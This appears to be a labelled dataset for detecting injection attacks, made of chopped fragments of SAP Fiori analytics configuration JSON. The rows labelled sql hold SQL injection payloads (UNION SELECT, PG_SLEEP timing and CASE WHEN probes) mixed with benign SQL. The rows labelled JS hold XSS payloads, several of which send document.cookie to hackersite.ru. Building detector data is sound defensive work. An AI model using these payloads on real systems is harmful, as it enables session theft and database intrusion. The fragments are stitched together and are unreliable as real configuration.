0,sql,"{ "generation": [{"templateId": "fioriw4template.fullScreen","templateVersion": "1.4.0","dateTimeStamp": "id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL - - vGXN"}], "translation": {"translationDomain": "", "supportedLanguages": "en,fr,de", "defaultLanguage": "en", "defaultI18NPropertyFile": "i18n.properties", "resourceModelName": "willy" }, "mockpreview": { "mockUri": "", "loadCustomRequests": true }}"
1,sql,"tmp/apf/config/odata/AnalyticalConfiguration.xsodata/AnalyticalConfigurationQueryResults('ID_7891')" 
2,sql,"{\"steps\":[{\"type\":\"step\",\"id\":\"ReceivablesandOverdueReceivablesbyCustomer\",\"request\":\"requestReceivablesandOverdueReceivablesbyCustomer\",\"binding\":\"bindingReceivablesandOverdueReceivablesbyCustomer\",\"title\":{\"type\":\"label\",\"kind\":\"text\",\"key\":\"SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY"
3,sql,":{\"type\":\"+CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 )",\"kind\":\"text\",\"key\":\"OverdueDebitAmtInDisplayCrcy_Ekey\"}"
4,sql,"},\"leftLower\":{\"type\":\"label\",\"kind\":\"text\",\"key\":\"dummy\"},\"SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 )"
5,sql,":{\"type\":\"select * from table order by 1\",\"kind\":\"text\",\"key\":\"dummy\"},\"rightLower\":{\"type\":\"label\",\"
6,sql,":\"text\",\"key\":\"CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries\"}},\"categories\":[{\"type\":\"category\",\"id\"
7,sql,":\"Customer\"}]},{\"type\":\"step\",\"id\":\"RevenuebyCustomerCountry\",\"declare v_num number():='&Digite_o_primeiro_numero'; v_num number():='&Digite_o_segundo_numero'; v_soma number();\"
8,sql,":\"requestRevenuebyCustomerCountry\",\"binding\":\"CREATE SEQUENCE customer_seq START WITH ; SELECT customer_seq curval from dual;\"
9,sql,",\"title\":{\"type\":\"label\",\"kind\":\"INSERT INTO CosineTable VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.)\",\"key\":\"titleStep-RevenuebyCustomerCountry\"},\"
10,sql,":{\"type\":\"INSERT INTO Salaries (CheckNum, Amount) VALUES (,), (,), (,), (,), (,), (,.), (,); SELECT Amount, MOST_FREQUENT FROM(SELECT Amount, COUNT(Amount) MOST_FREQUENT FROM TABLENAME GROUP BY Amount ORDER BY COUNT(Amount) DESC) WHERE ROWNUM =;;;;;;;;;;\",\"kind\":\"text\",\"key\":\"longTitleStep-RevenuebyCustomerCountry\"
11,JS,"},\"thumbnail\":{\"type\":\"thumbnail\",\"leftUpper\":{\"type\":\"label\",\"kind\":\"<script>alert(«cookie: «+ document.cookie )</script>\",\"key\":\"RevenueAmountInDisplayCrcy_Ekey\"},\"leftLower\":{\"type\":\"label\",\"kind\"
12,JS,":\"text\",\"key\":\"CustomerCountryNamekey\"}},\"categories\":[{\"type\":\"<script>alert(«cookie: «+ document.cookie )</script>\",\"id\":\"CustomerCountry\"}]},{\"type\":\"step\",\"id\":\"RevenuebyCustomerCountryMapping\",\"request\":\"
13,JS,":{\"requestForMappedFilter\":\"CustomerQuery\",\"target\":[\"Customer\"],\"keepSource\":\"false\"},\"title\":{\"type\":\"label\",\"kind\":\"text\",\"key\":\"titleStep-RevenuebyCustomerCountryMapToCustomer\"
14,JS,":{\"type\":\"label\",\"kind\":\"<script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>\",\"key\":\"RevenueAmountInDisplayCrcy_Ekey\"},\"leftLower\":{\"type\":\"label\",\"kind\":\"text\",\"key\":\"dummy\"},\"rightUpper\"
15,JS,",\"key\":\"longTitleStep-ReceivablesbyCustomerCountry\"},\"thumbnail\":{\"type\":\"<script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>\",\"leftUpper\":{\"type\":\"label\",\"kind\":\"text\",\"key\"
16,JS,":\"label\",\"kind\":\"text\",\"key\":\"dummy\"},\"rightUpper\":{\"type\":\"<script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>\",\"kind\":\"text\",\"key\":\"dummy\"
17,JS,",\"key\":\"CustomerCountryNamekey\"}},\"categories\":[{\"type\":\"category\",\"id\":\"CustomerCountry\"}]},{\"
18,JSON,"label\",\"kind\":\"text\",\"key\":\"<script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>\"},\"longTitle\":{\"type\":\"label\",\"kind\":\"text\",\"key\":\"longTitleStep-RevenuebyCustomer\"
19,JS,"},\"thumbnail\":{\"type\":\"thumbnail\",\"leftUpper\":{\"type\":\"label\",\"kind\":\"<script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>\",\"
20,JS,":\"longTitleStep-RevenuebyCustomeroverTime\"},\"thumbnail\":{\"type\":\"<script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>\",\"leftUpper\":{\"type\"
